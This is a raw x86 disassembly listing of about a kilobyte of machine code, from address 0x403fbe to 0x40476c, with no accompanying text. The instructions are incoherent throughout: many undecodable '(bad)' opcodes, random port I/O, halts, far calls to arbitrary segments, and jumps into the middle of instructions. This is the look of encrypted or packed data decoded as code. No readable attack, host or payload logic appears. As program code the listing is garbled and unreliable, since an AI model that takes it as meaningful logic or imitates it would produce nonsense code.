  403fbe:	dec    edi
  403fbf:	rcr    BYTE PTR [esp+eax*8],cl
  403fc2:	or     DWORD PTR [ebx],edi
  403fc4:	push   ebp
  403fc5:	data16 and BYTE PTR fs:[ebp+edx*2-0x2d],ah
  403fcb:	or     al,0x74
  403fcd:	xchg   edx,eax
  403fce:	fdivr  DWORD PTR [ebx]
  403fd0:	mov    edi,0x212b0225
  403fd5:	daa    
  403fd6:	sub    ebp,DWORD PTR [ebp+ebp*1-0x69ead70c]
  403fdd:	retf   
  403fde:	cli    
  403fdf:	or     dh,BYTE PTR [edx+0x71fdf420]
  403fe5:	add    ch,BYTE PTR ds:0x145ba577
  403feb:	das    
  403fec:	sub    DWORD PTR [edi+0x46],eax
  403fef:	repz mov cs,WORD PTR [edi+edi*4-0x4d]
  403ff4:	mov    eax,ds:0x75f60da
  403ff9:	or     edi,ebp
  403ffb:	push   edi
  403ffc:	pop    edx
  403ffd:	call   0xa7dd0fd2
  404002:	jp     0x403f96
  404004:	jnp    0x404020
  404006:	dec    ecx
  404007:	mov    esp,0x4233863a
  40400c:	mov    cl,0xe7
  40400e:	loop   0x40403d
  404010:	mov    bl,0xd7
  404012:	xchg   DWORD PTR [esi+0x1],esi
  404015:	les    esp,FWORD PTR [edx+esi*4-0x7ba34cf6]
  40401c:	sbb    al,0xf5
  40401e:	mov    WORD PTR ds:0xb8977c88,?
  404024:	sbb    BYTE PTR [ecx+0x2b4f5d95],al
  40402a:	dec    ecx
  40402b:	pusha  
  40402c:	loopne 0x404088
  40402e:	or     ch,bl
  404030:	icebp  
  404031:	pop    edi
  404032:	inc    ebx
  404033:	mov    ebx,0x2244d418
  404038:	jmp    0x40407b
  40403a:	pusha  
  40403b:	adc    esi,DWORD PTR [edx+0x78ce7d9]
  404041:	jnp    0x4040b3
  404043:	lds    ebp,FWORD PTR [eax-0x55f9d763]
  404049:	adc    DWORD PTR [ebx],ecx
  40404b:	(bad)  [ebx-0x707767a8]
  404051:	nop
  404052:	lods   al,BYTE PTR ds:[esi]
  404053:	ins    BYTE PTR es:[edi],dx
  404054:	mov    dl,0x67
  404056:	and    DWORD PTR [esi+ebp*2-0x5c],edx
  40405a:	es pop ds
  40405c:	pop    ebp
  40405d:	daa    
  40405e:	daa    
  40405f:	adc    ebp,DWORD PTR [edi]
  404061:	adc    dl,ch
  404063:	imul   ebx,DWORD PTR [ecx],0xffffffc5
  404066:	mov    bh,0xa3
  404068:	cwde   
  404069:	fild   WORD PTR [eax-0x3a]
  40406c:	jp     0x40403a
  40406e:	test   eax,0x1cfceb35
  404073:	jge    0x404053
  404075:	xchg   edi,eax
  404076:	xor    al,0x97
  404078:	shl    DWORD PTR [eax+0x74d70a12],0x73
  40407f:	add    cl,BYTE PTR [eax-0xd098dde]
  404085:	or     edx,DWORD PTR [edi]
  404087:	retf   0x867c
  40408a:	push   es
  40408b:	das    
  40408c:	xchg   ebp,eax
  40408d:	or     al,bh
  40408f:	sar    DWORD PTR [esi],cl
  404091:	fsubr  st(7),st
  404093:	lods   eax,DWORD PTR ds:[esi]
  404094:	out    dx,al
  404095:	neg    esp
  404097:	out    0x7c,eax
  404099:	shl    DWORD PTR ds:0x909ca172,1
  40409f:	adc    al,0x5f
  4040a1:	fiadd  WORD PTR [ecx]
  4040a3:	sub    BYTE PTR [eax],ch
  4040a5:	add    eax,DWORD PTR [eax-0x72da6839]
  4040ab:	in     al,dx
  4040ac:	add    esp,ecx
  4040ae:	mov    esp,0x892b375
  4040b3:	inc    ebp
  4040b4:	add    al,0xe6
  4040b6:	xlat   BYTE PTR ds:[ebx]
  4040b7:	mov    ah,0xe7
  4040b9:	add    eax,0x7247ac5a
  4040be:	xchg   ebx,eax
  4040bf:	pop    edi
  4040c0:	sbb    DWORD PTR [edx-0x2ddaca5],edi
  4040c6:	xchg   BYTE PTR [edx],ch
  4040c8:	xchg   esp,eax
  4040c9:	repz test al,0x83
  4040cc:	xchg   esp,eax
  4040cd:	rol    BYTE PTR [eax-0x39],cl
  4040d0:	repnz sub eax,0x846bcf0a
  4040d6:	ja     0x4040ad
  4040d8:	mov    ah,0x62
  4040da:	mov    edi,0xb3050959
  4040df:	cmp    al,0x22
  4040e1:	bound  eax,QWORD PTR [edi+0x2e892ed9]
  4040e7:	loop   0x404091
  4040e9:	out    dx,eax
  4040ea:	in     eax,0x27
  4040ec:	cmp    eax,0x60e4a5bc
  4040f1:	and    ah,BYTE PTR [esi]
  4040f3:	adc    BYTE PTR [ebx+0x73bc34f7],dh
  4040f9:	mov    ah,0x46
  4040fb:	sub    ebx,DWORD PTR [edi-0x48]
  4040fe:	cwde   
  4040ff:	push   eax
  404100:	bound  esp,QWORD PTR [esi]
  404102:	push   cs
  404103:	pusha  
  404104:	jecxz  0x4040c9
  404106:	dec    ebp
  404107:	or     BYTE PTR ds:0xf9829b09,bl
  40410d:	test   al,0x6e
  40410f:	in     al,0x42
  404111:	enter  0xa493,0x77
  404115:	neg    BYTE PTR [esi-0x6b]
  404118:	dec    ebp
  404119:	mov    ecx,0x5cf08a04
  40411e:	mov    dh,0xb7
  404120:	mov    ah,BYTE PTR [ecx]
  404122:	out    0x95,al
  404124:	outs   dx,DWORD PTR ds:[esi]
  404125:	pusha  
  404126:	cmc    
  404127:	aad    0x4
  404129:	jo     0x4040ff
  40412b:	pop    edx
  40412c:	push   esi
  40412d:	in     al,0x32
  40412f:	and    al,0x9d
  404131:	adc    eax,0xf7bf0b80
  404136:	adc    BYTE PTR [ecx],0x88
  404139:	gs (bad) 
  40413b:	xor    al,0x61
  40413d:	scas   eax,DWORD PTR es:[edi]
  40413e:	ss inc esi
  404140:	pop    esp
  404141:	not    DWORD PTR [edx+0x7551a8]
  404147:	jmp    0x61888657
  40414c:	add    DWORD PTR [edi+0x79],esi
  40414f:	out    dx,eax
  404150:	shr    DWORD PTR [edi+0x4],1
  404153:	jb     0x4040fd
  404155:	out    dx,eax
  404156:	dec    ebp
  404157:	out    dx,al
  404158:	stos   DWORD PTR es:[edi],eax
  404159:	pop    eax
  40415a:	loopne 0x404174
  40415c:	sub    al,0xbb
  40415e:	jecxz  0x404163
  404160:	cdq    
  404161:	hlt    
  404162:	adc    BYTE PTR [esp+ecx*8-0x4295a7b3],cl
  404169:	push   esp
  40416a:	mov    edi,0x7bb21f1
  40416f:	inc    edx
  404170:	call   0xccb08285
  404175:	sub    ecx,ecx
  404177:	mov    eax,ds:0xefce2f27
  40417c:	pop    edi
  40417d:	lahf   
  40417e:	jo     0x404130
  404180:	fs jno 0x404162
  404183:	mov    cs,WORD PTR [eax]
  404185:	aaa    
  404186:	push   esp
  404187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404188:	fwait
  404189:	je     0x40412d
  40418b:	inc    edi
  40418c:	dec    eax
  40418d:	inc    edx
  40418e:	push   ebp
  40418f:	cli    
  404190:	add    DWORD PTR [ebx+0x4c],0xfffffff3
  404194:	bound  esi,QWORD PTR [eax+0x2d]
  404197:	popa   
  404198:	gs (bad) 
  40419a:	stc    
  40419b:	inc    ebp
  40419c:	ins    BYTE PTR es:[edi],dx
  40419d:	jle    0x4041db
  40419f:	bound  esp,QWORD PTR [eax]
  4041a1:	mov    ah,0xf8
  4041a3:	movntq QWORD PTR [ebx+0x54fa026],mm4
  4041aa:	jg     0x404205
  4041ac:	and    BYTE PTR [ecx-0x2e5989],bl
  4041b2:	cdq    
  4041b3:	jb     0x404211
  4041b5:	ss adc eax,0x78ebd0b7
  4041bb:	xchg   esi,eax
  4041bc:	jp     0x4041da
  4041be:	enter  0x13b0,0xe0
  4041c2:	push   esp
  4041c3:	or     eax,0x97bd32c4
  4041c8:	inc    ecx
  4041c9:	into   
  4041ca:	or     BYTE PTR [eax+ecx*1-0x69],bh
  4041ce:	clc    
  4041cf:	shr    ebp,0x4d
  4041d2:	call   0xdbd8:0x2a9c5f4
  4041d9:	packssdw mm5,QWORD PTR [ecx]
  4041dc:	push   esi
  4041dd:	fistp  WORD PTR [edx+0xb]
  4041e0:	aam    0xfb
  4041e2:	(bad)  
  4041e3:	mov    al,0x26
  4041e5:	mov    ch,0x7
  4041e7:	or     DWORD PTR [edx-0x19563a0d],eax
  4041ed:	mov    eax,DWORD PTR [edx*1+0x2bfe1909]
  4041f4:	jle    0x4041e9
  4041f6:	ror    DWORD PTR [ebx+eiz*8+0x72],1
  4041fa:	and    ebx,DWORD PTR [ebp-0xac4fed6]
  404200:	fwait
  404201:	test   al,0xcf
  404203:	je     0x404209
  404205:	push   ss
  404206:	mov    bl,0x27
  404208:	mov    esp,0xa70aad82
  40420d:	xchg   esp,eax
  40420e:	cmp    DWORD PTR [edx-0x8],edi
  404211:	test   eax,0x6045435b
  404216:	shl    esi,1
  404218:	test   al,0xf4
  40421a:	aas    
  40421b:	hlt    
  40421c:	sub    ah,BYTE PTR [ecx]
  40421e:	mov    dh,0x63
  404220:	inc    ebp
  404221:	jle    0x4041f5
  404223:	cli    
  404224:	sub    ch,BYTE PTR [eax+esi*8-0x71]
  404228:	and    DWORD PTR [ebx],0x34c5f8db
  40422e:	mov    al,0x77
  404230:	dec    esp
  404231:	popf   
  404232:	shl    al,0xec
  404235:	push   edx
  404236:	shl    ebp,1
  404238:	sub    BYTE PTR [ecx-0x6f7c4897],0x11
  40423f:	jecxz  0x404270
  404241:	imul   ebx,DWORD PTR [ecx+edx*1-0x2be41507],0xdadf3abb
  40424c:	call   0x3397:0x42eaf70a
  404253:	adc    al,0x94
  404255:	test   bh,dl
  404257:	mov    ebp,0xe68fc667
  40425c:	jno    0x4042b3
  40425e:	add    al,0xcb
  404260:	push   0xdcf000e1
  404265:	and    al,0x67
  404267:	sti    
  404268:	addr16 xor cl,dh
  40426b:	stos   BYTE PTR es:[edi],al
  40426c:	je     0x404253
  40426e:	dec    eax
  40426f:	pop    esp
  404270:	jp     0x4042ce
  404272:	or     BYTE PTR [esp+ebp*2+0x61],bh
  404276:	cld    
  404277:	(bad)  
  404278:	mov    ebp,0x4bcb92fe
  40427d:	adc    esi,edi
  40427f:	outs   dx,DWORD PTR ds:[esi]
  404280:	(bad)  
  404281:	lods   al,BYTE PTR ds:[esi]
  404282:	mov    cl,0x80
  404284:	lahf   
  404285:	push   ebx
  404286:	jb     0x404264
  404288:	fwait
  404289:	jns    0x4042ff
  40428b:	jecxz  0x4042c6
  40428d:	xor    DWORD PTR [esi+0x5a5ec271],ebp
  404293:	popf   
  404294:	inc    edx
  404295:	and    esp,DWORD PTR [ebx+0x7d264d92]
  40429b:	mov    edx,0xc3af211f
  4042a0:	inc    edx
  4042a1:	sbb    edi,DWORD PTR [esi-0x344dd432]
  4042a7:	je     0x404267
  4042a9:	inc    edi
  4042aa:	cli    
  4042ab:	xchg   ecx,eax
  4042ac:	dec    edx
  4042ad:	mov    al,0x14
  4042af:	pop    edx
  4042b0:	add    DWORD PTR [ebx-0x7f],ebp
  4042b3:	pop    ecx
  4042b4:	sbb    esi,0xfffffffd
  4042b7:	dec    edi
  4042b8:	adc    DWORD PTR [eax+0x19],edi
  4042bb:	cld    
  4042bc:	fstp   DWORD PTR ds:0xbc06ac5c
  4042c2:	push   ds
  4042c3:	retf   0xd751
  4042c6:	stc    
  4042c7:	mov    bh,0x97
  4042c9:	cmp    bh,dh
  4042cb:	pusha  
  4042cc:	das    
  4042cd:	pop    es
  4042ce:	cld    
  4042cf:	mov    eax,0xd6e29024
  4042d4:	inc    ecx
  4042d5:	push   ecx
  4042d6:	enter  0xbc3f,0x38
  4042da:	and    cl,BYTE PTR [edi+edi*1]
  4042dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042de:	enter  0x4783,0x96
  4042e2:	push   0x4a
  4042e4:	sbb    BYTE PTR [edx+0x4a],bh
  4042e7:	addr16 dec ebp
  4042e9:	retf   
  4042ea:	and    BYTE PTR [ecx],cl
  4042ec:	ds push ss
  4042ee:	fidiv  DWORD PTR [edx+0x7a040d19]
  4042f4:	dec    esp
  4042f5:	sub    al,0x3f
  4042f7:	addr16 addr16 mov eax,0x336b6373
  4042fe:	and    BYTE PTR [edx+0x3c],bh
  404301:	outs   dx,BYTE PTR ds:[esi]
  404302:	int    0x1f
  404304:	stc    
  404305:	cwde   
  404306:	mov    ah,0x7f
  404308:	mov    esp,0xe49ea199
  40430d:	fwait
  40430e:	stc    
  40430f:	cli    
  404310:	mov    bl,0xa7
  404312:	loopne 0x40435b
  404314:	mov    bl,0xff
  404316:	push   edx
  404317:	pop    ecx
  404318:	xchg   ecx,eax
  404319:	xor    bl,BYTE PTR [ebx+0x2d]
  40431c:	adc    eax,0xb4399930
  404321:	pop    edi
  404322:	jmp    0x4042d1
  404324:	fimul  WORD PTR [edi-0x35]
  404327:	(bad)  
  404328:	ror    DWORD PTR [eax+0x4b74bd27],1
  40432e:	int3   
  40432f:	lock pushf 
  404331:	inc    edi
  404332:	cmp    esi,ecx
  404334:	retf   
  404335:	sahf   
  404336:	inc    esp
  404337:	shl    BYTE PTR [esi+0x6b],0xc9
  40433b:	push   esp
  40433c:	sbb    ebx,DWORD PTR [edi]
  40433e:	xchg   esi,eax
  40433f:	call   0x4d6:0x2f464123
  404346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404347:	aad    0x86
  404349:	addr16 add eax,0xe82847e6
  40434f:	jb     0x404327
  404351:	cmp    DWORD PTR [esi-0x7],esp
  404354:	jno    0x4043b1
  404356:	fidivr DWORD PTR [edx-0x73]
  404359:	sbb    al,0x5
  40435b:	xchg   ebx,eax
  40435c:	jge    0x40439f
  40435e:	add    DWORD PTR [ebx+0x62],0xbcbf14e9
  404365:	neg    DWORD PTR [edi]
  404367:	mov    edi,DWORD PTR [ecx]
  404369:	outs   dx,DWORD PTR ds:[esi]
  40436a:	jl     0x404379
  40436c:	call   0x6bca1714
  404371:	mov    ecx,0xf4a51f34
  404376:	add    BYTE PTR [edi-0xa],bl
  404379:	nop
  40437a:	jo     0x40439e
  40437c:	jo     0x40436f
  40437e:	imul   eax,DWORD PTR [edi],0xf783b42d
  404384:	pop    ebx
  404385:	mov    ss,WORD PTR [ebx]
  404387:	js     0x40437e
  404389:	sbb    BYTE PTR [edx+0x4],cl
  40438c:	inc    ebx
  40438d:	inc    esp
  40438e:	mov    bh,0xf9
  404390:	rol    DWORD PTR [ecx+0x43],0xc3
  404394:	lahf   
  404395:	arpl   WORD PTR [ebp-0x75],ax
  404398:	pop    edi
  404399:	pop    esp
  40439a:	fcom   DWORD PTR [ebp-0x432fa8d]
  4043a0:	loopne 0x4043f9
  4043a2:	pop    ecx
  4043a3:	xchg   edi,eax
  4043a4:	and    eax,DWORD PTR [edx]
  4043a6:	xchg   BYTE PTR [eax-0x34],bl
  4043a9:	das    
  4043aa:	sbb    DWORD PTR [ebp+0x3c58ac2b],0xffffffce
  4043b1:	cs pop eax
  4043b3:	je     0x4043b6
  4043b5:	leave  
  4043b6:	inc    edi
  4043b7:	sub    BYTE PTR [esi-0x29],cl
  4043ba:	mov    ebx,0x934c4402
  4043bf:	and    al,0x19
  4043c1:	inc    ebx
  4043c2:	pop    ss
  4043c3:	ret    
  4043c4:	fcomp  DWORD PTR [ebp+eax*4+0x73]
  4043c8:	(bad)  
  4043c9:	mov    eax,DWORD PTR [esi]
  4043cb:	sbb    BYTE PTR ds:0x81d04dd4,0xe3
  4043d2:	popa   
  4043d3:	rol    cl,cl
  4043d5:	inc    edi
  4043d6:	xchg   ebp,eax
  4043d7:	div    dh
  4043d9:	ja     0x40444d
  4043db:	xchg   edx,eax
  4043dc:	push   ebp
  4043dd:	scas   al,BYTE PTR es:[edi]
  4043de:	(bad)  
  4043df:	aad    0x4d
  4043e1:	push   ss
  4043e2:	stos   BYTE PTR es:[edi],al
  4043e3:	add    DWORD PTR [ecx-0x65fed01a],0xffffffbf
  4043ea:	icebp  
  4043eb:	mov    ebp,DWORD PTR [ebp+0x421d862c]
  4043f1:	jnp    0x404378
  4043f3:	pusha  
  4043f4:	adc    edx,DWORD PTR [ecx+0x50]
  4043f7:	xor    ch,ah
  4043f9:	xlat   BYTE PTR ds:[ebx]
  4043fa:	aaa    
  4043fb:	retf   
  4043fc:	inc    ebx
  4043fd:	sbb    BYTE PTR [esi-0x4e],bh
  404400:	pop    esp
  404401:	mov    edi,0x1dbe0abd
  404406:	loop   0x404435
  404408:	pop    ss
  404409:	pop    eax
  40440a:	movups xmm1,xmm6
  40440d:	enter  0xdf87,0xde
  404411:	mov    cl,0x2a
  404413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404415:	xchg   ebx,eax
  404416:	mov    WORD PTR [edi-0x54],?
  404419:	sbb    DWORD PTR [edx+edi*2-0x2],0x7de3a828
  404421:	scas   al,BYTE PTR es:[edi]
  404422:	das    
  404423:	outs   dx,DWORD PTR ds:[esi]
  404424:	ins    DWORD PTR es:[edi],dx
  404425:	or     DWORD PTR [ecx+0x1b62701a],esp
  40442b:	fwait
  40442c:	test   al,0xfd
  40442e:	inc    esi
  40442f:	mov    edx,0xedbe464
  404434:	cld    
  404435:	neg    ecx
  404437:	adc    ah,ah
  404439:	mov    ah,0x2b
  40443b:	pop    eax
  40443c:	mov    edi,DWORD PTR [eax-0x29018368]
  404442:	dec    esp
  404443:	cmp    bl,BYTE PTR [ebp-0x658ec90]
  404449:	fwait
  40444a:	pusha  
  40444b:	mov    ah,0x70
  40444d:	test   BYTE PTR [ecx-0x1c8a581a],0x33
  404454:	int3   
  404455:	repz or eax,0xf10c4d77
  40445b:	nop
  40445c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40445d:	iret   
  40445e:	loop   0x40447d
  404460:	ds popf 
  404462:	xchg   esi,eax
  404463:	jns    0x404426
  404465:	add    eax,esi
  404467:	es int3 
  404469:	repnz inc edx
  40446b:	adc    eax,0x2b9c2a68
  404470:	nop
  404471:	imul   edi,DWORD PTR [ecx-0x5e],0xffffffc5
  404475:	mov    WORD PTR [edi],cs
  404477:	mov    dl,0x4c
  404479:	jo     0x40448b
  40447b:	or     eax,0x9f5b739
  404480:	jl     0x4044e7
  404482:	(bad)  
  404483:	mov    ebx,0x66823696
  404488:	add    ch,bh
  40448a:	sti    
  40448b:	aad    0xe5
  40448d:	lock xchg DWORD PTR [eax+ebx*4-0x6b],ebp
  404492:	sub    BYTE PTR [ecx],dl
  404494:	enter  0x6496,0x2c
  404498:	lds    eax,FWORD PTR [esp+ecx*2-0x67778444]
  40449f:	mul    BYTE PTR [ecx+0x3c]
  4044a2:	cs lock inc eax
  4044a5:	cld    
  4044a6:	(bad)  [ebp-0x44]
  4044a9:	sub    al,0xdd
  4044ab:	sbb    esi,DWORD PTR [eax+0x5e856e66]
  4044b1:	das    
  4044b2:	xchg   esp,eax
  4044b3:	xchg   edx,eax
  4044b4:	imul   esp,DWORD PTR [ebx-0x7a],0x18
  4044b8:	add    BYTE PTR [ecx+0x5436409a],dl
  4044be:	sahf   
  4044bf:	hlt    
  4044c0:	push   0xfffffff8
  4044c2:	lods   al,BYTE PTR ds:[esi]
  4044c3:	in     al,dx
  4044c4:	(bad)  [eax+0x32]
  4044c7:	hlt    
  4044c8:	leave  
  4044c9:	out    dx,eax
  4044ca:	not    DWORD PTR [bx+si-0x1f]
  4044ce:	ror    BYTE PTR [ebx],0x7d
  4044d1:	inc    esp
  4044d2:	je     0x40447c
  4044d4:	js     0x404457
  4044d6:	or     edx,eax
  4044d8:	add    eax,0x48ccaf6d
  4044dd:	fcom   QWORD PTR [eax-0x78]
  4044e0:	cmp    bl,BYTE PTR [ebx]
  4044e2:	repnz mov ebx,0xe22449c1
  4044e8:	addr16 mov ah,0x7c
  4044eb:	shl    DWORD PTR [eax+esi*2],1
  4044ee:	add    bl,al
  4044f0:	and    ebp,DWORD PTR [ebp+0x2d]
  4044f3:	(bad)  
  4044f4:	rcl    dl,1
  4044f6:	jae    0x404556
  4044f8:	push   0xe2729279
  4044fd:	and    dl,BYTE PTR [ecx-0x14628a95]
  404503:	sub    eax,DWORD PTR [eax-0x337e6245]
  404509:	lods   eax,DWORD PTR ds:[esi]
  40450a:	je     0x4044d7
  40450c:	aam    0x90
  40450e:	scas   al,BYTE PTR es:[edi]
  40450f:	adc    DWORD PTR [ecx],esp
  404511:	sub    eax,0x11f3797a
  404516:	push   ecx
  404517:	(bad)  
  404518:	pop    edi
  404519:	in     eax,0x4a
  40451b:	pop    ss
  40451c:	dec    eax
  40451d:	fdivr  DWORD PTR [edx-0x65]
  404520:	xlat   BYTE PTR ds:[ebx]
  404521:	pop    eax
  404522:	inc    ecx
  404523:	scas   eax,DWORD PTR es:[edi]
  404524:	(bad)  
  404525:	jecxz  0x404547
  404527:	stos   DWORD PTR es:[edi],eax
  404528:	ins    DWORD PTR es:[edi],dx
  404529:	jmp    0x40456b
  40452b:	dec    edx
  40452c:	inc    ebp
  40452d:	outs   dx,DWORD PTR ds:[esi]
  40452e:	and    edx,DWORD PTR [edi+0x6463965f]
  404534:	cmp    eax,ecx
  404536:	out    0xf3,eax
  404538:	fadd   QWORD PTR [eax]
  40453a:	mov    dl,0xfd
  40453c:	jle    0x404530
  40453e:	xor    DWORD PTR [ebx-0x58],ecx
  404541:	iret   
  404542:	fst    QWORD PTR [ecx+0x36]
  404546:	retf   
  404547:	ret    0x7321
  40454a:	and    edi,DWORD PTR [edx]
  40454c:	rol    DWORD PTR [esi+0x4c],1
  40454f:	pushf  
  404550:	or     eax,0x8acb3b8d
  404555:	shr    BYTE PTR [edi-0x6e],0xd4
  404559:	dec    eax
  40455a:	imul   ecx,DWORD PTR [ecx+0x66200ef6],0xffffffb5
  404561:	mov    eax,ds:0x18198054
  404566:	xchg   ebp,eax
  404567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404568:	lahf   
  404569:	adc    bl,BYTE PTR [edx+0x28a9927a]
  40456f:	mov    al,0xe0
  404571:	cld    
  404572:	dec    ecx
  404573:	sub    BYTE PTR [ebx],al
  404575:	xchg   ebp,eax
  404576:	div    DWORD PTR ds:0x361dbada
  40457c:	sub    al,0x90
  40457e:	mov    al,0x71
  404580:	aam    0x2b
  404582:	std    
  404583:	dec    ecx
  404584:	hlt    
  404585:	mov    esi,0xf98804ce
  40458a:	push   ss
  40458b:	in     al,dx
  40458c:	pop    ebp
  40458d:	inc    ebp
  40458e:	ret    
  40458f:	in     eax,0x6a
  404591:	lods   eax,DWORD PTR ds:[esi]
  404592:	and    ecx,DWORD PTR [edi]
  404594:	adc    BYTE PTR [esi+0x15061385],bh
  40459a:	frndint 
  40459c:	jbe    0x404524
  40459e:	mov    ecx,0x4aa0d9c4
  4045a3:	add    bl,BYTE PTR [edi+0x23]
  4045a6:	mov    dl,BYTE PTR [edi]
  4045a8:	hlt    
  4045a9:	mov    ebp,0x1b841cd2
  4045ae:	shl    dl,cl
  4045b0:	add    bl,bl
  4045b2:	jns    0x404619
  4045b4:	in     eax,dx
  4045b5:	add    eax,esi
  4045b7:	add    al,0x22
  4045b9:	adc    eax,0xf2a346fd
  4045be:	inc    edx
  4045bf:	or     ah,dh
  4045c1:	dec    esp
  4045c2:	stos   BYTE PTR es:[edi],al
  4045c3:	sti    
  4045c4:	or     al,dl
  4045c6:	inc    eax
  4045c7:	iret   
  4045c8:	aaa    
  4045c9:	std    
  4045ca:	xchg   esi,eax
  4045cb:	mov    eax,ds:0x8a1587f4
  4045d0:	aam    0x46
  4045d2:	ret    
  4045d3:	jnp    0x4045d3
  4045d5:	push   edi
  4045d6:	loop   0x40462e
  4045d8:	sub    DWORD PTR [edx+eax*4],ebx
  4045db:	mov    al,ds:0x3437f1c2
  4045e0:	pop    ecx
  4045e1:	pop    eax
  4045e2:	adc    DWORD PTR [edi+0x47386fd8],ebp
  4045e8:	xor    al,0x16
  4045ea:	in     al,0x4
  4045ec:	xor    eax,0x3cf6a727
  4045f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f2:	dec    edi
  4045f3:	and    eax,0xfdd0289
  4045f8:	scas   al,BYTE PTR es:[edi]
  4045f9:	xlat   BYTE PTR ds:[ebx]
  4045fa:	pop    esi
  4045fb:	lods   al,BYTE PTR ds:[esi]
  4045fc:	inc    eax
  4045fd:	sub    DWORD PTR [ecx-0x2d],edi
  404600:	push   0xffffffd5
  404602:	ds enter 0x39a3,0x86
  404607:	xchg   cl,ch
  404609:	lahf   
  40460a:	in     eax,dx
  40460b:	adc    ebx,DWORD PTR [esi-0x179e8ee5]
  404611:	and    edi,DWORD PTR [esi]
  404613:	add    BYTE PTR [eax+0x7b],al
  404616:	std    
  404617:	ja     0x40463b
  404619:	jb     0x404613
  40461b:	loope  0x404646
  40461d:	imul   ecx,DWORD PTR [ebx+0x4a],0x16
  404621:	ret    0x7f15
  404624:	or     al,0x1f
  404626:	(bad)  
  404627:	fmul   QWORD PTR [esi-0x5e]
  40462a:	push   edi
  40462b:	pop    esp
  40462c:	sub    eax,0xe28e56cc
  404631:	jmp    0x40460d
  404633:	mov    BYTE PTR [ecx],dl
  404635:	inc    edx
  404636:	mov    cl,0x9a
  404638:	jmp    0x5021:0xb7f01a1
  40463f:	dec    edi
  404640:	lahf   
  404641:	dec    eax
  404642:	sbb    BYTE PTR [ebp+0x6d],0x1c
  404646:	push   esi
  404647:	jno    0x40461d
  404649:	repz retf 
  40464b:	jle    0x4045e0
  40464d:	test   eax,0x2307da58
  404652:	sub    DWORD PTR [ebp+0x15],ebx
  404655:	push   ebx
  404656:	call   0x327d:0x38498cc9
  40465d:	pop    ds
  40465e:	push   edi
  40465f:	mov    cl,0xa2
  404661:	jmp    FWORD PTR [edi-0x60]
  404664:	scas   eax,DWORD PTR es:[edi]
  404665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404666:	add    al,0x57
  404668:	inc    esp
  404669:	clc    
  40466a:	xor    edx,edx
  40466c:	push   0x5a431ac7
  404671:	jbe    0x404629
  404673:	(bad)  
  404674:	loop   0x404602
  404676:	xchg   edx,eax
  404677:	mov    eax,0x75ef73bd
  40467c:	jmp    0x4046fb
  40467e:	mov    edi,0x19f4e07a
  404683:	or     eax,0xfe908959
  404688:	pop    eax
  404689:	xor    BYTE PTR [edi+0x5c],ch
  40468c:	adc    cl,BYTE PTR [edi-0x1f]
  40468f:	inc    eax
  404690:	pushf  
  404691:	fdiv   st,st(4)
  404693:	jle    0x4046d3
  404695:	mov    esp,0x56c69798
  40469a:	call   0xa02e047b
  40469f:	es inc esp
  4046a1:	mov    dh,0xfd
  4046a3:	or     al,BYTE PTR [ecx+0x4d]
  4046a6:	cmp    DWORD PTR [ebx+ebp*8+0x4a15302d],edi
  4046ad:	sub    al,0x83
  4046af:	in     eax,0x92
  4046b1:	pop    ecx
  4046b2:	xchg   esp,eax
  4046b3:	push   eax
  4046b4:	daa    
  4046b5:	and    eax,0x8658f5e5
  4046ba:	pop    es
  4046bb:	jns    0x404716
  4046bd:	xchg   esi,eax
  4046be:	inc    edx
  4046bf:	retf   0x1316
  4046c2:	cmp    DWORD PTR [edx],ebp
  4046c4:	daa    
  4046c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c6:	mov    ebx,DWORD PTR [edx]
  4046c8:	adc    DWORD PTR [ebx-0x21b5dd01],ebx
  4046ce:	mov    ss,ecx
  4046d0:	push   0xffffffa8
  4046d2:	fmul   st,st(4)
  4046d4:	sbb    BYTE PTR [ebx+0x6d],bh
  4046d7:	jne    0x40469c
  4046d9:	mov    ah,BYTE PTR [edx-0x1d7a34d9]
  4046df:	retf   
  4046e0:	jp     0x404690
  4046e2:	xor    edx,ebx
  4046e4:	sbb    BYTE PTR [ebp+0x7f],bl
  4046e7:	scas   eax,DWORD PTR es:[edi]
  4046e8:	lods   al,BYTE PTR ds:[esi]
  4046e9:	lods   eax,DWORD PTR ds:[esi]
  4046ea:	sti    
  4046eb:	xchg   edi,eax
  4046ec:	and    DWORD PTR [esi-0x521326f8],ebp
  4046f2:	push   ebx
  4046f3:	push   0x6567b9a5
  4046f8:	mov    ecx,0x2b4bd62
  4046fd:	inc    ecx
  4046fe:	fwait
  4046ff:	or     eax,0x4c0ce801
  404704:	loopne 0x40476d
  404706:	or     esi,DWORD PTR [eax]
  404708:	jnp    0x40475c
  40470a:	mov    dl,0xfe
  40470c:	xor    eax,0x331d5ce8
  404711:	pop    ds
  404712:	mov    al,ds:0x65c656b9
  404717:	ret    
  404718:	clc    
  404719:	mov    ch,0xda
  40471b:	mov    ds:0xf66b89d8,al
  404720:	icebp  
  404721:	jmp    0x1914c6a8
  404726:	idiv   esi
  404728:	mov    dl,0xc4
  40472a:	inc    edi
  40472b:	js     0x404763
  40472d:	adc    ebx,DWORD PTR [esp+0x252e744e]
  404734:	mov    cl,0x45
  404736:	imul   eax,eax,0x5a
  404739:	mov    bl,0xab
  40473b:	xchg   edx,eax
  40473c:	(bad)  
  40473d:	ins    DWORD PTR es:[edi],dx
  40473e:	into   
  40473f:	fwait
  404740:	dec    eax
  404741:	jg     0x404714
  404743:	jmp    0x4047ba
  404745:	shl    BYTE PTR [edi-0x23d02a4f],0x35
  40474c:	fsubr  st,st(2)
  40474e:	js     0x4046d2
  404750:	lock ror BYTE PTR [edx],0x6
  404754:	(bad)  
  404755:	fbstp  TBYTE PTR [ecx-0x45ca7dba]
  40475b:	dec    eax
  40475c:	pop    ds
  40475d:	pop    ebp
  40475e:	in     al,dx
  40475f:	push   ss
  404760:	aaa    
  404761:	paddusb mm4,QWORD PTR [ebp+ecx*8-0x2c]
  404766:	push   es
  404767:	nop
  404768:	add    ch,ah
  40476a:	jb     0x40470d
  40476c:	test   BYTE PTR ds:0xfa13b43a,0xc6
